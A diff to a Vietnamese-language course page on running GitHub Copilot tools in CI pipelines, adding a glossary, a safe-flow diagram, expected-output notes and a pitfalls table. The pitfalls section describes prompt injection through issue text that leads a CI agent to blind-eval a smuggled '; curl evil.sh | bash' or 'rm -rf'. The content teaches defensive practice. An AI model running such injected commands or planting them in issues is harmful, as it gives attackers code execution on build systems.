@@ -17,6 +17,18 @@
 
 ---
 
+## 0. Giải ngố thuật ngữ (đọc trước, khỏi ngợp)
+
+| Thuật ngữ | Hiểu nôm na (1 câu) | Analogie | Ví dụ kỹ thuật thật | Verify |
+|---|---|---|---|---|
+| **Copilot SDK** | Bộ Lego để bạn tự lắp robot Copilot riêng (tools + luật + UI tùy ý). | Như mua động cơ + khung xe về độ xe riêng thay vì thuê taxi (`gh copilot`). | `new CopilotClient({allowedTools: ["read","grep"]})` — robot chỉ được đọc, cấm chạy shell. | Gọi tool cấm → SDK từ chối, log hiện `denied`. |
+| **`gh copilot` CLI** | Gọi Copilot từ terminal để gợi ý lệnh, giải thích, giao issue. | Như trợ lý đứng sau lưng khi bạn gõ terminal: "lệnh này nghĩa là...". | `gh copilot suggest "ffmpeg nén 4K→1080p"` in ra lệnh ffmpeg copy-paste được. | `gh copilot --version` in ra version (chưa cài thì báo `command not found`). |
+| **GitHub Actions workflow** | Kịch bản tự chạy trên máy GitHub mỗi khi push/PR/đúng giờ. | Như đặt báo thức + người giúp việc: "cứ có PR mới là chạy đi review". | `.github/workflows/copilot-review.yml` chạy `on: pull_request`. | Tab Actions repo hiện run xanh/vàng sau khi mở PR. |
+| **Coding agent** | Copilot cloud nhận issue → tự tạo branch `copilot/*` → mở PR draft. | Như giao việc cho thực tập sinh remote: bạn viết spec, 2h sau nhận PR. | `gh copilot assign 123 --repo acme/api` giao issue #123. | `gh pr list --author "app/copilot"` thấy PR mới. |
+| **Scheduled routine** | Job chạy theo giờ (cron) để triage/audit đêm. | Như ca trực đêm: 22h tự đi kiểm tra CI gãy rồi sáng báo cáo. | `cron: "0 22 * * *"` trong `copilot-ci-triage.yml`. | Tab Actions → workflow hiện `Scheduled` + lịch sử runs đêm qua. |
+
+---
+
 ## 1. Vì sao đưa Copilot vào pipeline? (why)
 
 Chat/VS Code cần người ngồi bấm Allow. CI runner **không có người**: job hỏi giữa
@@ -35,6 +47,30 @@ ACI pattern (thuộc lòng):
 Kịch bản hay: auto-review PR mới, auto-fix CI failure (mở PR fix, không push main),
 triage overnight failures (mở issue), weekly dep audit, docs sync check sau merge.
 
+### 1.1. Sơ đồ luồng CI an toàn (mermaid)
+
+```mermaid
+flowchart LR
+    A[PR mới / Cron 22h] --> B[Checkout + thu diff/log read-only]
+    B --> C{Cần review?}
+    C -->|PR mới| D[Request Copilot review + post diff-stat]
+    C -->|CI fail| E[Mở issue triage kèm log cắt gọn]
+    D --> F[Human review + CI xanh mới merge]
+    E --> G[Giao coding agent / on-call]
+    G --> H[PR fix mới - quay lại B]
+```
+
+Giải thích từng bước:
+
+1. **A → B:** Trigger duy nhất là `pull_request` hoặc `schedule` — không chạy theo comment bừa (tránh prompt-injection).
+2. **B:** Chỉ `contents: read`, thu `git diff` + log cắt 60KB — diff to hơn thì cắt + ghi `truncated=true`.
+3. **C → D:** PR mới → request `github-copilot[bot]` review + comment `diff-stat` (không eval code trong CI).
+4. **C → E:** Cron đêm thấy `conclusion==failure` → mở issue với log 8000 ký tự đầu, gắn label `ci`.
+5. **D/E → F/G:** Mọi merge/fix đều qua người + `branch protection` — routine chỉ báo cáo, không tự merge.
+6. **G → H → B:** Vòng lặp khép kín: issue mới → agent PR fix → lại review từ B.
+
+> ✅ **Kỳ vọng thấy gì:** mở PR test → tab Actions có run `copilot-review` xanh trong 2–5 phút + 1 comment `Auto diff-stat` dưới PR.
+
 ---
 
 ## 2. Copilot SDK — build agent riêng
@@ -46,13 +82,13 @@ triage overnight failures (mở issue), weekly dep audit, docs sync check sau me
 
 ### 2.1. Khi nào SDK vs `gh copilot` CLI vs coding agent? (bảng)
 
-| Nhu cầu | Chọn |
-|---|---|
-| 1 job review/audit trong CI | `gh copilot` CLI / coding agent (đủ, ít code) |
-| Multi-step orchestration custom (tools riêng, UI riêng) | Copilot SDK |
-| Nhúng agent vào backend internal (Slack bot, dashboard) | Copilot SDK |
-| Task độc lập → branch + PR, không cần trông | Coding agent (assign issue) |
-| Việc định kỳ (nightly triage, weekly audit) | Actions `schedule` + CLI/SDK |
+| Nhu cầu | Hiểu nôm na | Ví dụ | Chọn |
+|---|---|---|---|
+| 1 job review/audit trong CI | Việc nhỏ 1 bước, cần rẻ. | Review diff mỗi PR. | `gh copilot` CLI / coding agent (đủ, ít code) |
+| Multi-step orchestration custom (tools riêng, UI riêng) | Quy trình team quá lạ, cần độ xe riêng. | Bot Slack triage + dashboard nội bộ. | Copilot SDK |
+| Nhúng agent vào backend internal (Slack bot, dashboard) | Đưa Copilot vào app công ty. | Nút "Review bằng AI" trong dashboard. | Copilot SDK |
+| Task độc lập → branch + PR, không cần trông | Giao khoán 2h, quay lại nhận PR. | Issue rate-limit có acceptance criteria. | Coding agent (assign issue) |
+| Việc định kỳ (nightly triage, weekly audit) | Ca trực đêm/tuần tự chạy. | 22h quét CI gãy, sáng T2 audit deps. | Actions `schedule` + CLI/SDK |
 
 ### 2.2. SDK code mẫu (TypeScript — review PR, guardrailed)
 
@@ -101,6 +137,8 @@ npx tsx examples/copilot-review.ts
 # Kiểm tra: findings in ra? Thử prompt yêu cầu rm -rf → phải từ chối (allowlist hẹp).
 ```
 
+> ✅ **Kỳ vọng thấy gì:** terminal in 5–10 dòng findings checklist (`- [ ] ...`). Gõ thử `"xóa hết files"` → SDK trả `Tôi không được chạy shell` thay vì làm theo.
+
 ### 2.3. Secrets cho SDK/CLI (thuộc lòng)
 
 ```text
@@ -124,6 +162,8 @@ gh copilot suggest "viết lệnh ffmpeg nén video 4K còn 1080p"   # gợi ý 
 gh copilot explain "docker run --rm -v $(pwd):/app node:22 pnpm test"  # giải thích lệnh
 gh copilot assign 123 --repo acme/api     # giao issue cho coding agent (mục 5)
 ```
+
+> ✅ **Kỳ vọng thấy gì:** `gh copilot --version` in `vX.Y.Z`. `suggest` in 1–3 lệnh shell gợi ý + nút Run/Revise. `assign` trả về link issue đã gán Copilot.
 
 ```bash
 # Pattern scripts non-interactive (KHÔNG treo CI):
@@ -387,15 +427,17 @@ protection; lặp theo lịch → Actions schedule; nhúng hệ khác → SDK/CL
 
 ### 7.2. Pitfalls + fix
 
-| Pitfall | Vì sao | Fix |
-|---|---|---|
-| `eval $(gh copilot suggest ...)` mù trong CI | Tiện tay | Ghi file + human duyệt; Copilot output có thể bị prompt-injection |
-| Secrets echo ra CI log | Debug quên redact | Secrets qua env, `set -x` off khi dùng secrets, GitHub masked vars |
-| Job treo vì chờ approval | Dùng interactive trong CI | CI chỉ non-interactive + timeout-minutes |
-| Coding agent PR không review mà merge | Tin agent tuyệt đối | Review như PR người + required checks ON |
-| Issue sơ sài → agent đoán mò 3 rounds | Thiếu criteria | Template issue (mục 5.1) + label "ready" mới assign |
-| Routine tự merge khi vắng người | Job không giới hạn | Routine chỉ báo cáo/mở issue; merge luôn cần người |
-| SDK load config personal vào CI | Default rộng | Pin config repo, env CI tối thiểu |
+| Pitfall | Hiểu nôm na | Ví dụ | Vì sao | Fix |
+|---|---|---|---|---|
+| `eval $(gh copilot suggest ...)` mù trong CI | Chạy lệnh AI sinh ra mà không đọc. | CI chạy `rm -rf` do prompt-injection. | Tiện tay | Ghi file + human duyệt; Copilot output có thể bị prompt-injection |
+| Secrets echo ra CI log | In token ra log để debug. | Log hiện `ghp_xxxx` ai cũng thấy. | Debug quên redact | Secrets qua env, `set -x` off khi dùng secrets, GitHub masked vars |
+| Job treo vì chờ approval | Job hỏi giữa chừng mà không ai trả lời. | Job `suggest` chờ `Allow?` tới timeout 6h. | Dùng interactive trong CI | CI chỉ non-interactive + timeout-minutes |
+| Coding agent PR không review mà merge | Tin robot 100%. | Merge PR sai logic refund vào main. | Tin agent tuyệt đối | Review như PR người + required checks ON |
+| Issue sơ sài → agent đoán mò 3 rounds | Viết đề 1 dòng, bắt robot đoán. | Issue "fix login" không criteria → 3 PR sai. | Thiếu criteria | Template issue (mục 5.1) + label "ready" mới assign |
+| Routine tự merge khi vắng người | Ca đêm tự duyệt code lúc 2h sáng. | Job cron tự `gh pr merge` khi bạn đang ngủ. | Job không giới hạn | Routine chỉ báo cáo/mở issue; merge luôn cần người |
+| SDK load config personal vào CI | Máy CI đọc nhầm config máy bạn. | Local cho phép `exec`, CI cũng mở theo. | Default rộng | Pin config repo, env CI tối thiểu |
+
+> **Hiểu nhầm thường gặp:** "CI chạy Copilot là cho nó quyền admin cho nhanh." → **Thật ra:** CI cho quyền rộng + eval mù = RCE qua prompt-injection (issue text chứa `; curl evil.sh | bash`). Luôn scope `contents: read`, deny `exec`, timeout 10–20 phút.
 
 ### 7.3. Bài tập thực hành (cuối khóa)
 
